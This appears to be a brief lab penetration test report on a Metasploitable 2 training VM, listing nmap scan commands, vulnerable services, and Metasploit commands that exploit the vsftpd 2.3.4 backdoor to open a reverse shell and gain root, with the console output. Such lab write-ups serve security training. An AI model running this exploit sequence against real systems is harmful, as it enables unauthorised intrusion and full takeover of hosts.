 COMPLETE PENETRATION TEST REPORT
## Metasploitable 2 (192.168.234.129) â€” Full Assessment

*Date:* Jun 7, 2026
*Security Analyst:* Vijayram K
*Target System:* Metasploitable 2 Linux
*Target IP:* 192.168.234.129
*Assessment Status:* SUCCESSFULLY COMPROMISED
*Overall Risk Level:* CRITICAL

---

# PART 1 EXECUTIVE SUMMARY

Conducted comprehensive penetration test on Metasploitable 2 target system. Identified 24 open ports with 5 critical vulnerabilities. Successfully exploited vsftpd 2.3.4 backdoor (CVE-2011-2523) resulting in root-level shell access.

---

# PART 2 RECONNAISSANCE (NMAP SCAN)

## Scan Commands
nmap -sV 192.168.234.129
nmap -O 192.168.234.129
nmap -A 192.168.234.129
nmap -sV -p 21,22,80 192.168.234.129

## Target Information
- IP Address: 192.168.234.129
- Hostname: metasploitable.localdomain
- MAC: 00:0C:29:FA:DD:2A
- OS: Linux (Debian/Ubuntu)
- Open Ports: 24
- Scan Time: 50.03 seconds

## Critical Ports
Port 21  | FTP      | vsftpd 2.3.4 | CVE-2011-2523 | CRITICAL
Port 23  | Telnet   | Linux        | Multiple      | CRITICAL
Port 80  | HTTP     | Apache 2.2.8 | Multiple      | CRITICAL
Port 3306| MySQL    | 5.0.51a      | Multiple      | CRITICAL
Port 5900| VNC      | Protocol 3.3 | Weak Auth     | CRITICAL

---

# PART 3 VULNERABILITY ASSESSMENT

## vsftpd 2.3.4 (Port 21)
- CVE ID: CVE-2011-2523
- Type: Remote Code Execution (RCE)
- CVSS: 9.8 CRITICAL
- Auth Required: None
- Status: Exploitable

---

# PART 4 EXPLOITATION

## Metasploit Commands
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set LHOST 192.168.234.128
set RHOSTS 192.168.234.129
run

## Output
[*] Started reverse TCP handler on 192.168.234.128:4444
[+] 192.168.234.129:21 - Backdoor has been spawned!
[+] Meterpreter session 1 opened

---

# PART 5 POST-EXPLOITATION

## Shell Access
meterpreter > shell
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root)

ROOT ACCESS CONFIRMED

---

# REPORT METADATA

Analyst: Vijayram K
Date: Jun 7, 2026
Target: 192.168.234.129
Status: Complete
Privilege: Root (uid=0)
Result: System Fully Compromised
